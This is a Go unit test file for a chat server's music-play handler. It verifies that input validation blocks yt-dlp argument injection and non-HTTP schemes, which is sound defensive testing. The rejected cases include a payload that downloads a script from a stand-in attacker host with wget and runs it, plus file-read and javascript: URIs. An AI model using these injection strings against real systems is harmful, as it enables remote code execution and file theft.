package handlers

import (
	"bytes"
	"context"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/argeinfina/hichat/models"
	"github.com/argeinfina/hichat/services"
)

// ─── Stubs ───
//
// Minimal interface implementations — recorded calls let us verify
// the handler doesn't reach the service layer when validation rejects
// a request (the central RCE-prevention guarantee for /music/play).

type stubMusicService struct {
	enqueueCalled bool
	lastURL       string
}

func (s *stubMusicService) Enqueue(_ context.Context, _, _, url string) ([]models.MusicTrack, error) {
	s.enqueueCalled = true
	s.lastURL = url
	return []models.MusicTrack{}, nil
}
func (s *stubMusicService) Skip(string) error                            { return nil }
func (s *stubMusicService) Pause(string) error                           { return nil }
func (s *stubMusicService) Resume(string) error                          { return nil }
func (s *stubMusicService) Stop(string) error                            { return nil }
func (s *stubMusicService) GetState(string) *models.MusicBotChannelState { return nil }
func (s *stubMusicService) StopAllForChannel(string)                     {}

// stubPermResolver always grants — perm check is not under test here.
type stubPermResolver struct{}

func (stubPermResolver) ResolveChannelPermissions(_ context.Context, _, _ string) (models.Permission, error) {
	return models.PermAll, nil
}

// Compile-time interface conformance assertions.
var (
	_ services.MusicBotService     = (*stubMusicService)(nil)
	_ services.ChannelPermResolver = stubPermResolver{}
)

// ─── Helpers ───

func newPlayRequest(t *testing.T, body string) *http.Request {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, "/api/servers/srv/channels/ch/music/play", bytes.NewBufferString(body))
	req.SetPathValue("channelId", "ch")
	req.Header.Set("Content-Type", "application/json")
	// Inject an authenticated user — Play() requires UserContextKey set.
	user := &models.User{ID: "user-1", Username: "tester"}
	req = req.WithContext(context.WithValue(req.Context(), UserContextKey, user))
	return req
}

// ─── Tests ───

// TestPlay_RejectsNonHTTPScheme — the RCE protection: any URL that
// doesn't start with http:// or https:// must be rejected with 400
// BEFORE the music service is invoked. This blocks yt-dlp argument
// injection payloads like `--exec "..."` at the HTTP edge.
func TestPlay_RejectsNonHTTPScheme(t *testing.T) {
	cases := []struct {
		name string
		url  string
	}{
		{"argument-injection-exec", `--exec "wget http://attacker/x -O /tmp/x && sh /tmp/x"`},
		{"argument-injection-config", `--config-location /tmp/evil`},
		{"file-scheme", `file:///etc/passwd`},
		{"ftp-scheme", `ftp://example.com/file`},
		{"bare-path", `/etc/passwd`},
		{"javascript-uri", `javascript:alert(1)`},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			music := &stubMusicService{}
			h := NewMusicHandler(music, stubPermResolver{})

			rec := httptest.NewRecorder()
			req := newPlayRequest(t, `{"url":`+jsonString(tc.url)+`}`)
			h.Play(rec, req)

			if rec.Code != http.StatusBadRequest {
				t.Fatalf("expected 400, got %d (body: %s)", rec.Code, rec.Body.String())
			}
			if music.enqueueCalled {
				t.Fatalf("Enqueue must NOT be called for rejected URL %q (got: %q)", tc.url, music.lastURL)
			}
		})
	}
}

// TestPlay_AcceptsHTTPSchemes — sanity check that legitimate URLs reach
// the service. Without this, a too-strict validator could silently break
// the music feature; this test would catch that.
func TestPlay_AcceptsHTTPSchemes(t *testing.T) {
	cases := []string{
		"http://example.com/video",
		"https://youtu.be/dQw4w9WgXcQ",
		"https://www.youtube.com/watch?v=dQw4w9WgXcQ",
	}
	for _, url := range cases {
		t.Run(url, func(t *testing.T) {
			music := &stubMusicService{}
			h := NewMusicHandler(music, stubPermResolver{})

			rec := httptest.NewRecorder()
			req := newPlayRequest(t, `{"url":`+jsonString(url)+`}`)
			h.Play(rec, req)

			if rec.Code != http.StatusOK {
				t.Fatalf("expected 200 for %q, got %d (body: %s)", url, rec.Code, rec.Body.String())
			}
			if !music.enqueueCalled {
				t.Fatalf("Enqueue must be called for valid URL %q", url)
			}
			if music.lastURL != url {
				t.Fatalf("Enqueue got url=%q, want %q", music.lastURL, url)
			}
		})
	}
}

// TestPlay_RejectsEmptyURL — early-return path for {"url":""}; preserved
// behavior, just covered by a test now.
func TestPlay_RejectsEmptyURL(t *testing.T) {
	music := &stubMusicService{}
	h := NewMusicHandler(music, stubPermResolver{})

	rec := httptest.NewRecorder()
	req := newPlayRequest(t, `{"url":""}`)
	h.Play(rec, req)

	if rec.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d", rec.Code)
	}
	if music.enqueueCalled {
		t.Fatal("Enqueue must NOT be called for empty URL")
	}
}

// jsonString — minimal JSON string escaper for embedding test inputs
// inline. Handles the two characters we actually exercise in these test
// payloads (backslash + double-quote); good enough to avoid pulling in
// encoding/json just to build a one-line body.
func jsonString(s string) string {
	var b bytes.Buffer
	b.WriteByte('"')
	for _, r := range s {
		switch r {
		case '\\':
			b.WriteString(`\\`)
		case '"':
			b.WriteString(`\"`)
		default:
			b.WriteRune(r)
		}
	}
	b.WriteByte('"')
	return b.String()
}
